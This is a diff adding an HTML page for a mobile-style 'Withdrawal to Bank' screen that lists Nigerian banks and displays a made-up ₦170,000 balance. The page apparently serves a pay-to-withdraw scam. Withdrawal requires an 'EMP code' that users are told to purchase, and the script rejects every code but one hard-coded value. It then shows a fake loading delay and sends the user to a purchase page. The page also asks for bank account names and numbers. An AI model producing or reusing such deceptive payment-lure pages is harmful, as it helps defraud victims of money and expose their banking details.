@@ -1,0 +1,158 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Withdrawal to Bank</title>
+  <style>
+    :root { --orange:#FF7A00; --line:#d9dee5; --navy:#1C1C4D; }
+    * { box-sizing: border-box; }
+    html, body { height:100%; }
+    body {
+      margin:0; background:#fff; color:#101315;
+      font-family:"Noto Sans", system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+    }
+    .wrap { min-height:100vh; display:flex; flex-direction:column; }
+    .topbar {
+      height:56px; display:flex; align-items:center; justify-content:center;
+      position:relative; border-bottom:1px solid #f1f3f6;
+    }
+    .topbar h1 { margin:0; font-size:18px; font-weight:800; color:#1b2a4a; letter-spacing:.4px; }
+    .back { position:absolute; left:10px; top:50%; transform:translateY(-50%); background:transparent; border:0; padding:8px; }
+    .content { padding:16px; max-width:560px; margin:0 auto; width:100%; }
+    .section-title { margin:12px 2px 10px; font-weight:800; color:#1b2a4a; font-size:14px; opacity:.85; }
+    .card { background:#fff; border:1px solid #f1f3f6; border-radius:16px; padding:14px; box-shadow:0 8px 24px rgba(0,0,0,0.04); }
+    .field { margin-bottom:14px; }
+    .label { display:block; font-size:12px; color:#3b4654; margin-bottom:6px; letter-spacing:.3px; }
+    .input, .select {
+      width:100%; padding:14px 12px; border:1px solid var(--line); border-radius:12px; background:#fff; font-size:16px; outline:none;
+    }
+    .hint { font-size:12px; color:#6b7789; margin-top:6px; }
+    .link { color:var(--orange); text-decoration:none; font-weight:700; }
+    .bottom { margin-top:16px; text-align:center; }
+    .balance { font-weight:800; color:#1b2a4a; margin-bottom:10px; }
+    .btn {
+      display:inline-block; background:var(--orange); color:#fff; border:0; padding:16px 22px; border-radius:14px;
+      font-weight:800; font-size:16px; min-width:60%; text-align:center;
+    }
+    .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.5);display:none;place-items:center;z-index:1000}
+    .modal{background:#fff;border-radius:16px;max-width:520px;margin:0 16px;padding:18px 16px;box-shadow:0 10px 30px rgba(0,0,0,0.2);border:1px solid #ffe1c5}
+    .modal-head{display:flex;align-items:center;gap:8px;color:#FF7A00;font-weight:800;font-size:18px;margin-bottom:8px}
+    .modal p{color:#1C1C4D;font-size:14px;line-height:1.5;margin:8px 0}
+    .note{font-size:12px;color:#6b7789;margin-top:8px}
+    .modal-footer{display:flex;justify-content:flex-end;margin-top:12px}
+    .link-buy{background:none;border:0;color:#FF7A00;font-weight:800;cursor:pointer}
+    .overlay-loading{position:fixed;inset:0;background:rgba(0,0,0,0.6);display:none;place-items:center;z-index:1100}
+    .spinner{width:48px;height:48px;border:4px solid rgba(255,122,0,0.25);border-top-color:#FF7A00;border-radius:50%;animation:spin 1s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <header class="topbar" aria-label="Page header">
+      <button class="back" onclick="history.back()" aria-label="Go back">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1b2a4a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M15 18l-6-6 6-6"/>
+        </svg>
+      </button>
+      <h1>Withdrawal to Bank</h1>
+    </header>
+
+    <main class="content" aria-label="Withdrawal form">
+      <h2 class="section-title">Bank Details</h2>
+      <section class="card">
+        <form action="#" method="post" novalidate>
+          <div class="field">
+            <label class="label" for="accName">Account Name</label>
+            <input class="input" id="accName" type="text" placeholder="Enter account name" autocomplete="name" required />
+          </div>
+
+          <div class="field">
+            <label class="label" for="accNumber">Account Number (10 digits)</label>
+            <input class="input" id="accNumber" type="tel" inputmode="numeric" pattern="\\d{10}" maxlength="10" placeholder="0123456789" required />
+          </div>
+
+          <div class="field">
+            <label class="label" for="bank">Select Bank</label>
+            <select class="select" id="bank" required>
+              <option>Access Bank</option>
+              <option>Zenith Bank</option>
+              <option>Guaranty Trust Bank (GTBank)</option>
+              <option>First Bank of Nigeria</option>
+              <option>United Bank for Africa (UBA)</option>
+              <option>Fidelity Bank</option>
+              <option>First City Monument Bank (FCMB)</option>
+              <option>Union Bank</option>
+              <option>Stanbic IBTC Bank</option>
+              <option>Sterling Bank</option>
+              <option>Wema Bank (ALAT)</option>
+              <option>Keystone Bank</option>
+              <option>Polaris Bank</option>
+              <option>Unity Bank</option>
+              <option>Heritage Bank</option>
+              <option>Titan Trust Bank</option>
+              <option>Jaiz Bank</option>
+              <option>Providus Bank</option>
+              <option>Globus Bank</option>
+              <option>SunTrust Bank</option>
+              <option>Kuda Microfinance Bank</option>
+              <option>OPay (Paycom) Bank</option>
+              <option>PalmPay</option>
+              <option>Moniepoint MFB</option>
+              <option>Rubies Bank</option>
+            </select>
+          </div>
+
+          <div class="field">
+            <label class="label" for="amount">Amount</label>
+            <input class="input" id="amount" type="number" min="0" step="0.01" placeholder="Enter amount" required />
+          </div>
+
+          <div class="field">
+            <label class="label" for="emp">EMP CODE</label>
+            <input class="input" id="emp" type="text" placeholder="Enter EMP code" required />
+            <p class="hint"><a class="link" href="#" aria-label="Buy EMP code" id="buyLink">Buy EMP code</a></p>
+          </div>
+
+          <div class="bottom">
+            <p class="balance">Available Balance: ₦170,000.00</p>
+            <button class="btn" type="submit">Submit</button>
+          </div>
+        </form>
+      </section>
+    </main>
+  </div>
+  <div id="modal" class="modal-overlay" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <div class="modal">
+      <div class="modal-head">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <rect x="2" y="5" width="20" height="14" rx="2" fill="#26C281"/><path d="M6 12h6" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+        <span id="modalTitle">Activation Pin</span>
+      </div>
+      <p>Invalid activation code. Please purchase your activation code from the application to continue the process and start making money daily. Hope you enjoy our app.</p>
+      <p class="note">NOTE: Your activation code cannot be shared; each activation code is designed for a single user.</p>
+      <div class="modal-footer">
+        <button id="goBuy" class="link-buy">BUY EMP CODE</button>
+      </div>
+    </div>
+  </div>
+  <div id="loading" class="overlay-loading" aria-label="Loading"><div class="spinner" aria-hidden="true"></div></div>
+  <script>
+    document.querySelector('form').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const code = document.getElementById('emp').value.trim();
+      if (code !== 'EMP123200') { document.getElementById('modal').style.display = 'grid'; return; }
+      const q = new URLSearchParams({ amount: '170000' }).toString();
+      window.location.href = 'processing.html?' + q;
+    });
+    document.getElementById('buyLink').addEventListener('click', (e)=>{ e.preventDefault(); document.getElementById('modal').style.display='grid'; });
+    document.getElementById('goBuy').addEventListener('click', ()=>{
+      const loader = document.getElementById('loading');
+      document.getElementById('modal').style.display='none';
+      loader.style.display='grid';
+      setTimeout(()=>{ window.location.href='buy-emp.html'; }, 5000);
+    });
+  </script>
+</body>
+</html>
